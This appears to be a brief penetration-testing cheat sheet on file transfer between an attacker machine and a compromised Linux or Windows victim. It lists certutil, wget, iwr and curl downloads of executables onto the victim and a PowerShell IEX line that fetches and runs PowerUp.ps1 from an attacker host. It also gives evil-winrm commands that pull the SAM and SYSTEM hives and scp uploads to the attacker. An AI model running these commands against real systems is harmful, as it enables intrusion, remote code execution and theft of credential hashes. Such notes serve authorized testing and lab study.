# Basic commands for file share:
<img width="1024" height="1024" alt="Husky hacker sharing files" src="https://github.com/user-attachments/assets/855e63f6-2110-47dd-80bd-7f73c0a02b43" />

## Commands
```
python3 -m http.server 80
```
Victim/Attacker Linux:
```
wget http://<ip>/file
```
Victim Windows:
```
certutil -urlcache -f -split http://<KALI_IP>/file.exe output.exe
certutil -urlcache http://<IP>/something.exe C:\Users\Administrator\Desktop\something.exe
```
Powershell:
```
iwr -uri http://<KALI_IP>/file.exe -OutFile file.exe
```
```
curl http://<IP>/somthing.exe -o something.exe
```
```
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
```
With evil-winrm:
```
download sam
download system 
```
Windows example to get files:
```
scp C:\Users\Admin\Documents\file.txt kali@<IP>:/home/kali/Desktop/
```
